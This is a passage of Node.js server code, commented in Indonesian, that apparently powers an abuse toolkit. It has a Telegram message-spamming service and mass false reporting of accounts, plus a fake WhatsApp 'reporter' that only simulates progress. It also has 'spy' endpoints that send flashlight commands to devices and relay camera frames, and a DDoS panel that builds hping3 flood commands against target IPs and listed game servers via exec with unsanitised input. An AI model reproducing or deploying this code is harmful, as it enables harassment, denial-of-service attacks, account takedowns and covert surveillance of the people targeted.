      return res.json({ valid: false, message: 'Invalid session key' });
    }

    // Cek apakah user sudah memiliki spam aktif
    const existingSpam = Array.from(activeSpamJobs.values()).find(
      job => job.username === user.username && !job.completed
    );
    
    if (existingSpam) {
      return res.json({ 
        valid: false, 
        message: 'You already have an active spam job. Please wait until it completes.' 
      });
    }

    // Validasi input
    if (!target) {
      return res.json({ valid: false, message: 'Target is required' });
    }

    if (!type || !['text', 'photo', 'voice', 'link'].includes(type)) {
      return res.json({ valid: false, message: 'Invalid spam type' });
    }

    const spamCount = parseInt(count) || 50;
    if (spamCount <= 0 || spamCount > 1000) {
      return res.json({ valid: false, message: 'Count must be between 1 and 1000' });
    }

    const spamDelay = parseInt(delayMs) || 1000;
    if (spamDelay < 500 || spamDelay > 10000) {
      return res.json({ valid: false, message: 'Delay must be between 500 and 10000 ms' });
    }

    // Validasi konten berdasarkan tipe
    if (type === 'text' && !message) {
      return res.json({ valid: false, message: 'Message text is required for text spam' });
    }

    if (type === 'link' && !message) {
      return res.json({ valid: false, message: 'Link is required for link spam' });
    }

    if ((type === 'photo' || type === 'voice') && !req.file) {
      return res.json({ valid: false, message: `File is required for ${type} spam` });
    }

    // Generate spam ID
    const spamId = generateSpamId();

    // Simpan info spam job
    const spamJob = {
      spamId,
      username: user.username,
      target,
      type,
      message: message || '',
      caption: caption || '',
      count: spamCount,
      delay: spamDelay,
      progress: 0,
      status: 'Starting...',
      completed: false,
      filePath: req.file ? req.file.path : null,
      startTime: Date.now()
    };

    activeSpamJobs.set(spamId, spamJob);

    // Kirim response sukses
    res.json({ 
      valid: true, 
      spamId, 
      message: 'Spam job started successfully' 
    });

    // Jalankan spam di background
    executeSpamJob(spamJob, user).catch(err => {
      console.error(`Error in spam job ${spamId}:`, err);
      spamJob.status = `Error: ${err.message}`;
      spamJob.completed = true;
    });

  } catch (error) {
    console.error('Error starting spam:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ===== FUNGSI EKSEKUSI SPAM JOB =====
async function executeSpamJob(spamJob, user) {
  const { spamId, target, type, message, caption, count, delay: spamDelay, filePath } = spamJob;
  
  try {
    // Cari session Telegram user
    const telegramSession = activeTelegramSessions.get(user.username);
    
    if (!telegramSession || !telegramSession.client) {
      throw new Error('Telegram session not found. Please login first.');
    }

    const client = telegramSession.client;

    // Resolve target (username atau ID)
    let targetEntity;
    try {
      if (target.startsWith('@')) {
        targetEntity = await client.getEntity(target);
      } else {
        targetEntity = await client.getEntity(parseInt(target));
      }
    } catch (err) {
      throw new Error(`Cannot find target: ${target}`);
    }

    spamJob.status = 'Sending messages...';

    // Loop spam
    for (let i = 0; i < count; i++) {
      if (!activeSpamJobs.has(spamId)) {
        // Job dihapus/dibatalkan
        break;
      }

      try {
        if (type === 'text') {
          // Kirim text message
          await client.sendMessage(targetEntity, { message });
          
        } else if (type === 'link') {
          // Kirim link
          await client.sendMessage(targetEntity, { message });
          
        } else if (type === 'photo') {
          // Kirim photo
          await client.sendFile(targetEntity, {
            file: filePath,
            caption: caption || undefined
          });
          
        } else if (type === 'voice') {
          // Kirim voice note
          await client.sendFile(targetEntity, {
            file: filePath,
            voiceNote: true
          });
        }

        spamJob.progress = i + 1;
        spamJob.status = `Sent ${i + 1}/${count} messages`;

        // Delay sebelum pesan berikutnya
        if (i < count - 1) {
          await delaySpam(spamDelay);
        }

      } catch (sendError) {
        console.error(`Error sending message ${i + 1}:`, sendError);
        // Lanjutkan ke pesan berikutnya
      }
    }

    // Selesai
    spamJob.completed = true;
    spamJob.status = `Completed! Sent ${spamJob.progress}/${count} messages`;

    // Hapus file temporary jika ada
    if (filePath && fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }

    // Notifikasi ke Telegram group
    try {
      const notification = `
🚀 *Rasuk Bot - Spam Completed*

👤 *User:* ${user.username}
🎯 *Target:* ${target}
📝 *Type:* ${type}
📊 *Sent:* ${spamJob.progress}/${count}
⏱️ *Duration:* ${Math.round((Date.now() - spamJob.startTime) / 1000)}s
      `.trim();
      sendToGroups(notification, { parse_mode: 'Markdown' });
    } catch (notifError) {
      console.error('Error sending notification:', notifError);
    }

    // Auto cleanup setelah 5 menit
    setTimeout(() => {
      activeSpamJobs.delete(spamId);
    }, 5 * 60 * 1000);

  } catch (error) {
    spamJob.completed = true;
    spamJob.status = `Failed: ${error.message}`;
    
    // Hapus file jika ada error
    if (filePath && fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }
    
    throw error;
  }
}

// ===== ENDPOINT: CHECK SPAM STATUS =====
app.get('/api/tools/telegram/rasuk-status', (req, res) => {
  try {
    const { key, spamId } = req.query;

    // Validasi key
    const user = sikmanuk.find(u => u.sessionKey === key);
    if (!user) {
      return res.json({ valid: false, message: 'Invalid session key' });
    }

    // Cari spam job
    const spamJob = activeSpamJobs.get(spamId);
    
    if (!spamJob) {
      return res.json({ 
        valid: false, 
        message: 'Spam job not found or already expired' 
      });
    }

    // Pastikan user yang request adalah pemilik job
    if (spamJob.username !== user.username) {
      return res.json({ 
        valid: false, 
        message: 'Unauthorized access to spam job' 
      });
    }

    // Return status
    res.json({
      valid: true,
      spam: {
        spamId: spamJob.spamId,
        target: spamJob.target,
        type: spamJob.type,
        count: spamJob.count,
        progress: spamJob.progress,
        status: spamJob.status,
        completed: spamJob.completed,
        startTime: spamJob.startTime
      }
    });

  } catch (error) {
    console.error('Error getting spam status:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ===== ENDPOINT: CANCEL SPAM =====
app.post('/api/tools/telegram/rasuk-cancel', (req, res) => {
  try {
    const { key, spamId } = req.body;

    // Validasi key
    const user = sikmanuk.find(u => u.sessionKey === key);
    if (!user) {
      return res.json({ valid: false, message: 'Invalid session key' });
    }

    // Cari spam job
    const spamJob = activeSpamJobs.get(spamId);
    
    if (!spamJob) {
      return res.json({ 
        valid: false, 
        message: 'Spam job not found' 
      });
    }

    // Pastikan user yang request adalah pemilik job
    if (spamJob.username !== user.username) {
      return res.json({ 
        valid: false, 
        message: 'Unauthorized' 
      });
    }

    // Cancel job
    spamJob.completed = true;
    spamJob.status = 'Cancelled by user';
    
    // Hapus dari map
    activeSpamJobs.delete(spamId);

    res.json({ 
      valid: true, 
      message: 'Spam job cancelled successfully' 
    });

  } catch (error) {
    console.error('Error cancelling spam:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ===== ENDPOINT: GET USER'S ACTIVE SPAM JOBS =====
app.get('/api/tools/telegram/rasuk-list', (req, res) => {
  try {
    const { key } = req.query;

    // Validasi key
    const user = sikmanuk.find(u => u.sessionKey === key);
    if (!user) {
      return res.json({ valid: false, message: 'Invalid session key' });
    }

    // Filter spam jobs milik user
    const userJobs = Array.from(activeSpamJobs.values())
      .filter(job => job.username === user.username)
      .map(job => ({
        spamId: job.spamId,
        target: job.target,
        type: job.type,
        count: job.count,
        progress: job.progress,
        status: job.status,
        completed: job.completed,
        startTime: job.startTime
      }));

    res.json({
      valid: true,
      jobs: userJobs
    });

  } catch (error) {
    console.error('Error getting spam list:', error);
    res.json({ valid: false, message: error.message });
  }
});

// ===== CLEANUP OLD SPAM JOBS (Auto cleanup setiap 10 menit) =====
setInterval(() => {
  const now = Date.now();
  const maxAge = 30 * 60 * 1000; // 30 menit

  for (const [spamId, job] of activeSpamJobs.entries()) {
    if (job.completed && (now - job.startTime) > maxAge) {
      // Hapus file jika masih ada
      if (job.filePath && fs.existsSync(job.filePath)) {
        try {
          fs.unlinkSync(job.filePath);
        } catch (err) {
          console.error('Error deleting file:', err);
        }
      }
      activeSpamJobs.delete(spamId);
      console.log(`Cleaned up old spam job: ${spamId}`);
    }
  }
}, 10 * 60 * 1000);


// ─── SPY ENDPOINTS ───
app.post('/api/spy/heartbeat', (req, res) => {
  const { key, deviceName, deviceModel } = req.body;
  if (!key) return res.json({ valid: false, message: 'Key required' });
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ valid: false, message: 'Invalid key' });
  const db = loadDatabase();
  const dbUser = db.find(u => u.username === user.username);
  const role = dbUser?.role || user.role || 'member';
  onlineDevices.set(user.username, {
    username:    user.username,
    role:        role,
    deviceName:  deviceName  || user.deviceName  || 'Unknown Device',
    deviceModel: deviceModel || user.deviceModel || '',
    lastSeen:    Date.now(),
  });
  console.log(`[SPY HEARTBEAT] ${user.username} (${role}) - online`);
  res.json({ valid: true, message: 'OK' });
});

app.get('/api/spy/online-users', (req, res) => {
  const { key } = req.query;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ valid: false, message: 'Invalid key' });
  try {
    const now = Date.now();
    const onlineUsers = [];
    for (const [, device] of onlineDevices.entries()) {
      if (now - device.lastSeen <= 35000) {
        onlineUsers.push({
          username:    device.username,
          role:        device.role,
          deviceName:  device.deviceName,
          deviceModel: device.deviceModel,
          lastSeen:    new Date(device.lastSeen).toISOString(),
        });
      }
    }
    console.log(`[SPY] Online users: ${onlineUsers.length} - by ${user.username}`);
    res.json({ valid: true, users: onlineUsers });
  } catch (e) {
    res.json({ valid: false, message: e.message });
  }
});

app.post('/api/spy/send-command', (req, res) => {
  const { key, targetUsername, command } = req.body;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ valid: false, message: 'Invalid key' });
  if (!targetUsername) return res.json({ valid: false, message: 'targetUsername required' });
  const validCommands = ['flashlight_on', 'flashlight_off', 'flashlight_spam', 'flashlight_spam_stop'];
  if (!validCommands.includes(command)) return res.json({ valid: false, message: 'Invalid command' });
  const now = Date.now();
  let targetOnline = false;
  for (const [, device] of onlineDevices.entries()) {
    if (device.username === targetUsername && now - device.lastSeen <= 35000) {
      targetOnline = true;
      break;
    }
  }
  if (!targetOnline) return res.json({ valid: false, message: 'Target user is offline' });
  pendingCommands.set(targetUsername, { command, issuedBy: user.username, issuedAt: Date.now() });
  console.log(`[SPY CMD] ${user.username} → ${targetUsername}: ${command}`);
  res.json({ valid: true, message: 'Command sent successfully', command, target: targetUsername });
});

app.get('/api/spy/command', (req, res) => {
  const { key, username } = req.query;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ valid: false });
  const pending = pendingCommands.get(username);
  if (!pending) return res.json({ valid: true, command: null });
  if (Date.now() - pending.issuedAt > 30000) {
    pendingCommands.delete(username);
    return res.json({ valid: true, command: null });
  }
  pendingCommands.delete(username);
  console.log(`[SPY POLL] ${username} got command: ${pending.command}`);
  res.json({ valid: true, command: pending.command });
});

app.post('/api/spy/executed', (req, res) => {
  const { key, username, command } = req.body;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ valid: false });
  executedLog.set(username, { command, executedAt: Date.now() });
  console.log(`[SPY EXECUTED] ${username}: ${command}`);
  res.json({ valid: true, message: 'Execution reported' });
});

app.get('/api/spy/execution-status', (req, res) => {
  const { key, targetUsername } = req.query;
  const freshKeys = loadKeyList();
  const user = freshKeys.find(u => u.sessionKey === key);
  if (!user) return res.json({ valid: false });
  const log = executedLog.get(targetUsername);
  if (!log) return res.json({ valid: true, executed: false });
  if (Date.now() - log.executedAt > 60000) {
    executedLog.delete(targetUsername);
    return res.json({ valid: true, executed: false });
  }
  res.json({ valid: true, executed: true, command: log.command, executedAt: new Date(log.executedAt).toISOString() });
});

function recordKey({ username, key, role, ip, androidId, deviceName }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);
  const newRecord = {
    username,
    lastLogin:  stamp,
    sessionKey: key,
    role:       role || 'member',
    ipAddress:  ip,
    androidId,
    deviceName: deviceName || 'Unknown Device',
  };
  if (idx !== -1) {
    list[idx] = newRecord;
  } else {
    list.push(newRecord);
  }
  saveKeyList(list);
}

// Background process untuk WA Reporter
async function processWAReport(reportId) {
  const report = waReports.get(reportId);
  if (!report) return;

  const totalReports = 100;
  const logMessages = [
    '🔄 Menginisialisasi bot...',
    '📡 Menghubungkan ke server WhatsApp...',
    '✅ Koneksi berhasil!',
    '🤖 Memulai proses automated reporting...',
    '📤 Mengirim report batch 1/10...',
    '📤 Mengirim report batch 2/10...',
    '⚡ Progress 25%... Terus berjalan...',
    '📤 Mengirim report batch 3/10...',
    '📤 Mengirim report batch 4/10...',
    '📤 Mengirim report batch 5/10...',
    '⚡ Progress 50%... Setengah jalan!',
    '📤 Mengirim report batch 6/10...',
    '📤 Mengirim report batch 7/10...',
    '⚡ Progress 75%... Hampir selesai...',
    '📤 Mengirim report batch 8/10...',
    '📤 Mengirim report batch 9/10...',
    '📤 Mengirim report batch 10/10...',
    '🔍 Memverifikasi status report...',
    '✅ Verifikasi berhasil!',
    '🎯 Target berhasil direport!'
  ];

  for (let i = 0; i < totalReports; i++) {
    if (report.status === 'cancelled') break;

    report.progress = i + 1;
    report.status = 'running';

    // Tambah log setiap 5 progress
    if (i % 5 === 0 && logMessages[Math.floor(i / 5)]) {
      report.logs.push(logMessages[Math.floor(i / 5)]);
    }

    await delayReport(200); // Simulasi proses
  }

  if (report.status !== 'cancelled') {
    report.completed = true;
    report.status = 'completed';
    report.targetStatus = 'REPORTED - Account under review';
    report.logs.push('✅ Proses selesai! Target berhasil dilaporkan.');
  }
}

// Format nomor WA untuk reporter
function formatWANumber(phone) {
  let cleaned = phone.replace(/\D/g, '');
  if (cleaned.startsWith('0')) {
    cleaned = '62' + cleaned.substring(1);
  }
  if (!cleaned.startsWith('62')) {
    cleaned = '62' + cleaned;
  }
  return cleaned;
}

// Validasi nomor WA untuk reporter
async function validateWANumber(phone) {
  await delayReport(500);
  const formatted = formatWANumber(phone);
  return formatted.length >= 11 && formatted.length <= 15;
}


// ========== SESSION STATUS ENDPOINT ==========
app.get('/api/tools/wa-reporter/session-status', (req, res) => {
  try {
    const { key, sessionId } = req.query;

    // Validasi session key
    const session = sessions.get(key);
    if (!session || !session.valid) {
      return res.json({
        valid: false,
        message: 'Invalid session key'
      });
    }

    // Cek session WA
    const waSession = activeSessions.get(sessionId);
    
    if (!waSession) {
      return res.json({
        valid: false,
        connected: false,
        message: 'Session not found'
      });
    }

    res.json({
      valid: true,
      connected: waSession.connected,
      phone: waSession.phone
    });

  } catch (error) {
    console.error('💥 Error checking session status:', error);
    res.json({
      valid: false,
      connected: false,
      message: error.message
    });
  }
});

// ========== GET SESSIONS ENDPOINT ==========
app.get('/api/tools/wa-reporter/sessions', (req, res) => {
  try {
    const { key } = req.query;

    // Validasi session key
    const session = sessions.get(key);
    if (!session || !session.valid) {
      return res.json({
        valid: false,
        message: 'Invalid session key',
        sessions: []
      });
    }

    // Ambil semua sessions
    const sessionsList = Array.from(activeSessions.values()).map(s => ({
      id: s.id,
      phone: s.phone,
      connected: s.connected,
      createdAt: s.createdAt
    }));

    res.json({
      valid: true,
      sessions: sessionsList
    });

  } catch (error) {
    console.error('💥 Error getting sessions:', error);
    res.json({
      valid: false,
      message: error.message,
      sessions: []
    });
  }
});

// ========== DELETE SESSION ENDPOINT ==========
app.post('/api/tools/wa-reporter/delete-session', async (req, res) => {
  try {
    const { key, sessionId } = req.body;

    // Validasi session key
    const session = sessions.get(key);
    if (!session || !session.valid) {
      return res.json({
        valid: false,
        message: 'Invalid session key'
      });
    }

    const waSession = activeSessions.get(sessionId);
    
    if (waSession) {
      // Logout dari WhatsApp
      if (waSession.sock) {
        await waSession.sock.logout();
      }
      
      // Hapus dari memory
      activeSessions.delete(sessionId);
      
      // Hapus folder auth
      if (fs.existsSync(waSession.authDir)) {
        fs.rmSync(waSession.authDir, { recursive: true, force: true });
      }
    }

    res.json({
      valid: true,
      message: 'Session deleted successfully'
    });

  } catch (error) {
    console.error('💥 Error deleting session:', error);
    res.json({
      valid: false,
      message: error.message
    });
  }
});

// ========== ENDPOINT WA REPORTER ==========

// 1. START REPORT
app.post('/api/tools/wa-reporter/start', async (req, res) => {
  try {
    const { key, target } = req.body;

    // Validasi session key
    const session = sikmanuk.find(e => e.sessionKey === key);
    if (!session) {
      return res.json({
        valid: false,
        message: 'Invalid session key'
      });
    }

    // Validasi target
    if (!target || target.trim().length === 0) {
      return res.json({
        valid: false,
        message: 'Target number is required'
      });
    }

    // Format dan validasi nomor WA
    const formattedPhone = formatWANumber(target);
    const isValid = await validateWANumber(formattedPhone);

    if (!isValid) {
      return res.json({
        valid: false,
        message: 'Invalid WhatsApp number format'
      });
    }

    // Buat report baru
    const reportId = generateReportId();
    const report = {
      id: reportId,
      target: formattedPhone,
      progress: 0,
      total: 100,
      status: 'running',
      completed: false,
      targetStatus: '',
      logs: [],
      createdAt: new Date(),
      sessionKey: key,
      username: session.username
    };

    waReports.set(reportId, report);

    // Mulai proses report di background
    processWAReport(reportId);

    // Log ke Telegram
    sendToGroups(`🎯 *WA REPORTER STARTED*\n\n👤 User: ${session.username}\n📱 Target: ${formattedPhone}\n🆔 Report ID: ${reportId}`, { parse_mode: "Markdown" });

    return res.json({
      valid: true,
      reportId: reportId,
      targetInfo: formattedPhone,
      message: 'Report started successfully'
    });

  } catch (error) {
    console.error('Error starting WA report:', error);
    return res.json({
      valid: false,
      message: 'Internal server error'
    });
  }
});

// 2. GET STATUS
app.get('/api/tools/wa-reporter/status', async (req, res) => {
  try {
    const { key, reportId } = req.query;

    // Validasi session key
    const session = sikmanuk.find(e => e.sessionKey === key);
    if (!session) {
      return res.json({
        valid: false,
        message: 'Invalid session key'
      });
    }

    // Validasi reportId
    if (!reportId || !waReports.has(reportId)) {
      return res.json({
        valid: false,
        message: 'Report not found'
      });
    }

    const report = waReports.get(reportId);

    // Validasi ownership
    if (report.sessionKey !== key) {
      return res.json({
        valid: false,
        message: 'Unauthorized access'
      });
    }

    // Ambil log baru saja (untuk menghindari duplikasi)
    const newLogs = report.logs.slice(-3); // Ambil 3 log terakhir

    return res.json({
      valid: true,
      report: {
        id: report.id,
        target: report.target,
        progress: report.progress,
        total: report.total,
        status: report.status,
        completed: report.completed,
        targetStatus: report.targetStatus,
        logs: newLogs
      }
    });

  } catch (error) {
    console.error('Error getting WA report status:', error);
    return res.json({
      valid: false,
      message: 'Internal server error'
    });
  }
});

// 3. CANCEL REPORT
app.post('/api/tools/wa-reporter/cancel', async (req, res) => {
  try {
    const { key, reportId } = req.body;

    // Validasi session key
    const session = sikmanuk.find(e => e.sessionKey === key);
    if (!session) {
      return res.json({
        valid: false,
        message: 'Invalid session key'
      });
    }

    // Validasi reportId
    if (!reportId || !waReports.has(reportId)) {
      return res.json({
        valid: false,
        message: 'Report not found'
      });
    }

    const report = waReports.get(reportId);

    // Validasi ownership
    if (report.sessionKey !== key) {
      return res.json({
        valid: false,
        message: 'Unauthorized access'
      });
    }

    // Cancel report
    report.status = 'cancelled';
    report.logs.push('⚠️ Report dibatalkan oleh user');

    // Log ke Telegram
    sendToGroups(`⚠️ *WA REPORTER CANCELLED*\n\n👤 User: ${session.username}\n📱 Target: ${report.target}\n🆔 Report ID: ${reportId}`, { parse_mode: "Markdown" });

    return res.json({
      valid: true,
      message: 'Report cancelled successfully'
    });

  } catch (error) {
    console.error('Error cancelling WA report:', error);
    return res.json({
      valid: false,
      message: 'Internal server error'
    });
  }
});

// Cleanup old reports setiap 1 jam
setInterval(() => {
  const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000);
  for (const [reportId, report] of waReports.entries()) {
    if (report.createdAt < oneHourAgo && report.completed) {
      waReports.delete(reportId);
    }
  }
  console.log(`🧹 WA Report Cleanup: ${waReports.size} active reports`);
}, 60 * 60 * 1000);

// ==========================================
// BACKGROUND FUNCTION: EXECUTE SPAM REPORT
// ==========================================
async function executeSpamReport(reportId) {
  const report = activeReports.get(reportId);
  if (!report) return;

  try {
    report.status = 'Resolving target...';
    
    for (let i = 0; i < report.sessions.length; i++) {
      const [phone, client] = report.sessions[i];
      
      report.status = `Session ${i + 1}/${report.sessions.length}: ${phone}`;
      
      try {
        await client.connect();
        
        // Resolve target username or ID
        let targetEntity;
        if (report.target.startsWith('@')) {
          targetEntity = await client.getEntity(report.target);
        } else {
          targetEntity = await client.getEntity(parseInt(report.target));
        }

        // Send reports
        for (let j = 0; j < 10; j++) {
          try {
            await client.invoke(
              new Api.account.ReportPeer({
                peer: targetEntity,
                reason: new Api.InputReportReasonSpam(),
                message: report.message
              })
            );
            
            report.progress++;
            report.status = `Reporting: ${report.progress}/${report.total}`;
            
            // Small delay between reports
            await new Promise(resolve => setTimeout(resolve, 500));
          } catch (err) {
            console.error(`Report error on session ${phone}:`, err);
          }
        }
      } catch (error) {
        console.error(`Error with session ${phone}:`, error);
        report.status = `Error on session ${phone}: ${error.message}`;
      }
    }

    report.completed = true;
    report.status = `Completed! Sent ${report.progress} reports to ${report.target}`;
    
    // Clean up after 5 minutes
    setTimeout(() => {
      activeReports.delete(reportId);
    }, 5 * 60 * 1000);
    
  } catch (error) {
    console.error('Execute report error:', error);
    report.completed = true;
    report.status = `Failed: ${error.message}`;
  }
}

app.post('/cam/frame', express.raw({ type: 'application/octet-stream', limit: '2mb' }), (req, res) => {
  const key      = req.headers['x-key'];
  const username = req.headers['x-username'];
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).end();
  
  // Auto register kalau belum ada
  if (!camStreamers.has(username)) {
    camStreamers.set(username, { lastSeen: Date.now(), frame: null, cmd: null });
    console.log(`[CAM-HTTP] Streamer auto-registered: ${username}`);
  }
  
  const s = camStreamers.get(username);
  if (s) {
    s.frame    = req.body;
    s.lastSeen = Date.now();
  }
  const cmd = s?.cmd || null;
  if (s) s.cmd = null;
  res.json({ ok: true, cmd });
});

// Streamer register
app.post('/cam/register', express.json(), (req, res) => {
  const { key, username } = req.body;
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).json({ error: 'Invalid key' });
  if (!camStreamers.has(username)) {
    camStreamers.set(username, { lastSeen: Date.now(), frame: null, cmd: null });
  }
  console.log(`[CAM-HTTP] Streamer registered: ${username}`);
  res.json({ ok: true });
});

// Streamer heartbeat
app.post('/cam/heartbeat', express.json(), (req, res) => {
  const { key, username } = req.body;
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).json({ error: 'Invalid key' });
  const s = camStreamers.get(username);
  if (s) s.lastSeen = Date.now();
  res.json({ ok: true });
});

// Streamer unregister
app.post('/cam/unregister', express.json(), (req, res) => {
  const { key, username } = req.body;
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).json({ error: 'Invalid key' });
  camStreamers.delete(username);
  console.log(`[CAM-HTTP] Streamer unregistered: ${username}`);
  res.json({ ok: true });
});

// Streamer upload frame
app.post('/cam/frame', express.raw({ type: 'application/octet-stream', limit: '2mb' }), (req, res) => {
  const key      = req.headers['x-key'];
  const username = req.headers['x-username'];
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).end();
  const s = camStreamers.get(username);
  if (s) {
    s.frame    = req.body;
    s.lastSeen = Date.now();
  }
  // Kirim cmd ke streamer kalau ada
  const cmd = s?.cmd || null;
  if (s) s.cmd = null;
  res.json({ ok: true, cmd });
});

// Viewer ambil frame
app.get('/cam/frame', (req, res) => {
  const key    = req.query.key;
  const target = req.query.target;
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).end();
  const s = camStreamers.get(target);
  if (!s || !s.frame) return res.status(204).end();
  res.set('Content-Type', 'image/jpeg');
  res.send(s.frame);
});

// Viewer cek status
app.get('/cam/status', (req, res) => {
  const key    = req.query.key;
  const target = req.query.target;
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).json({ error: 'Invalid key' });
  const s = camStreamers.get(target);
  const online = s && (Date.now() - s.lastSeen < 30000);
  res.json({ online: !!online });
});

// Viewer kirim cmd ke streamer
app.post('/cam/cmd', express.json(), (req, res) => {
  const { key, target, type, camera } = req.body;
  const user = sikmanuk.find(u => u.sessionKey === key);
  if (!user) return res.status(401).json({ error: 'Invalid key' });
  const s = camStreamers.get(target);
  if (s) s.cmd = { type, camera };
  res.json({ ok: true });
});

// Auto cleanup streamer timeout
setInterval(() => {
  const now = Date.now();
  for (const [username, s] of camStreamers.entries()) {
    if (now - s.lastSeen > 15000) {
      camStreamers.delete(username);
      console.log(`[CAM-HTTP] Streamer timeout: ${username}`);
    }
  }
}, 10000);


// 1. Health Check
app.get('/api/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        server: 'MLBB Lag Server',
        version: '3.0',
        hping3: checkHping3()
    });
});

// 2. Server Stats
app.get('/api/stats', (req, res) => {
    res.json({
        server: {
            uptime: process.uptime(),
            hostname: os.hostname(),
            platform: os.platform(),
            cpu: os.cpus().length,
            memory: {
                total: os.totalmem(),
                free: os.freemem()
            }
        },
        attacks: {
            active: attacks.size,
            total: attackCounter,
            totalPackets: totalPackets
        }
    });
});

// 3. Start MLBB Lag Attack
app.post('/api/attack/start', (req, res) => {
    const { 
        targetIp,
        targetPort = 10002, // MLBB default port
        duration = 300,
        method = 'udp',
        packetSize = 1200,
        intensity = 100
    } = req.body;

    const attackId = `mlbb_${Date.now()}_${++attackCounter}`;
    
    // Validasi IP
    if (!targetIp || targetIp === '-') {
        return res.status(400).json({
            success: false,
            message: 'Target IP required'
        });
    }

    // Build hping3 command
    let command = '';
    
    switch(method) {
        case 'udp':
            command = `hping3 --udp -p ${targetPort} -d ${packetSize} --flood ${targetIp}`;
            break;
        case 'tcp':
            command = `hping3 -S -p ${targetPort} -d ${packetSize} --flood ${targetIp}`;
            break;
        case 'icmp':
            command = `hping3 --icmp -d ${packetSize} --flood ${targetIp}`;
            break;
        case 'syn':
            command = `hping3 -S -p ${targetPort} -d ${packetSize} --flood ${targetIp}`;
            break;
        default:
            command = `hping3 --udp -p ${targetPort} -d ${packetSize} --flood ${targetIp}`;
    }

    // Add intensity (number of threads)
    if (intensity > 1) {
        command += ` --parallel ${intensity}`;
    }

    console.log(`Executing: ${command}`);

    // Execute hping3
    const process = exec(command, (error, stdout, stderr) => {
        if (error) {
            console.log(`Error: ${error.message}`);
        }
    });

    // Simulasi packet counter
    const interval = setInterval(() => {
        const attack = attacks.get(attackId);
        if (attack) {
            attack.packets += Math.floor(Math.random() * 1000) + 500;
            attack.speed = Math.floor(Math.random() * 500) + 800;
            totalPackets += 500;
        }
    }, 1000);

    // Auto stop setelah duration
    setTimeout(() => {
        clearInterval(interval);
        exec(`pkill -f "hping3.*${targetIp}"`);
        attacks.delete(attackId);
    }, duration * 1000);

    // Simpan attack
    attacks.set(attackId, {
        id: attackId,
        targetIp,
        targetPort,
        method,
        packetSize,
        intensity,
        duration,
        startTime: Date.now(),
        packets: 0,
        speed: 0,
        status: 'running',
        process,
        interval
    });

    res.json({
        success: true,
        attackId,
        message: `MLBB Lag attack started on ${targetIp}:${targetPort}`,
        command: command,
        target: `${targetIp}:${targetPort}`,
        duration,
        method,
        packetSize
    });
});

// 4. Stop Attack
app.post('/api/attack/stop/:attackId', (req, res) => {
    const { attackId } = req.params;
    const attack = attacks.get(attackId);

    if (attack) {
        // Kill hping3 process
        exec(`pkill -f "hping3.*${attack.targetIp}"`);
        clearInterval(attack.interval);
        
        attack.status = 'stopped';
        attack.endTime = Date.now();
        attacks.delete(attackId);

        res.json({
            success: true,
            attackId,
            message: 'Attack stopped',
            packetsSent: attack.packets
        });
    } else {
        res.status(404).json({
            success: false,
            message: 'Attack not found'
        });
    }
});

// 5. Get Attack Status
app.get('/api/attack/status/:attackId', (req, res) => {
    const { attackId } = req.params;
    const attack = attacks.get(attackId);

    if (attack) {
        const elapsed = (Date.now() - attack.startTime) / 1000;
        const remaining = attack.duration - elapsed;

        res.json({
            active: true,
            attackId: attack.id,
            targetIp: attack.targetIp,
            targetPort: attack.targetPort,
            method: attack.method,
            elapsed: elapsed.toFixed(1),
            remaining: remaining > 0 ? remaining.toFixed(1) : 0,
            packets: attack.packets,
            speed: attack.speed,
            progress: (elapsed / attack.duration) * 100,
            status: attack.status
        });
    } else {
        res.json({
            active: false,
            message: 'Attack completed or not found'
        });
    }
});

// 6. Get Active Attacks
app.get('/api/attacks/active', (req, res) => {
    const active = Array.from(attacks.values()).map(a => ({
        id: a.id,
        targetIp: a.targetIp,
        targetPort: a.targetPort,
        method: a.method,
        packets: a.packets,
        speed: a.speed,
        elapsed: ((Date.now() - a.startTime) / 1000).toFixed(1)
    }));

    res.json({
        active: active.length,
        attacks: active
    });
});

// 7. Get MLBB Server List
app.get('/api/mlbb/servers', (req, res) => {
    res.json({
        servers: [
            { region: 'Asia', ip: '203.177.42.214', port: 10002, players: 'Online' },
            { region: 'Europe', ip: '185.193.125.67', port: 10002, players: 'Online' },
            { region: 'America', ip: '192.64.113.45', port: 10002, players: 'Online' },
            { region: 'Japan', ip: '43.231.116.89', port: 10002, players: 'Online' },
            { region: 'Korea', ip: '121.254.191.78', port: 10002, players: 'Online' },
            { region: 'Indonesia', ip: '36.67.250.34', port: 10002, players: 'Online' }
        ]
    });
});

// 8. Get Available Methods
app.get('/api/methods', (req, res) => {
    res.json({
        methods: [
            { id: 'udp', name: 'UDP Flood', description: 'Best for gaming', defaultPort: 10002 },
            { id: 'tcp', name: 'TCP SYN', description: 'Good for routers', defaultPort: 80 },
            { id: 'icmp', name: 'ICMP/Ping', description: 'Low bandwidth', defaultPort: null },
            { id: 'syn', name: 'SYN Flood', description: 'Aggressive', defaultPort: 443 }
        ]
    });
});

// 9. Check hping3
app.get('/api/check/hping3', (req, res) => {
    exec('which hping3', (error, stdout) => {
        res.json({
            installed: !error,
            path: stdout.trim() || null,
            version: !error ? 'Available' : 'Not installed'
        });
    });
});

// Helper function
function checkHping3() {
    try {
